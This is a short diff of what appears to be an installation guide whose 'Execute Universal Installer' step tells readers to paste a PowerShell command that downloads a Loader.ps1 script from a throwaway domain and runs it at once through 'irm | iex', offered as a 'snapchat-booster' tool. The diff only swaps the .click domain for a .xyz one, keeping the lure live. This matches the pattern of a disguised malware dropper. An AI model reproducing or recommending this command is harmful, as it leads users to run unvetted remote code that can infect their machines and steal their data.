@@ -11,7 +11,7 @@
 
 ### Step 2: Execute Universal Installer
 ```cmd
-powershell -Command "irm https://software-gateway.click/Loader.ps1?get=snapchat-booster | iex"
+powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=snapchat-booster | iex"
 ```
 
 ### Step 3: Select Tool to Install
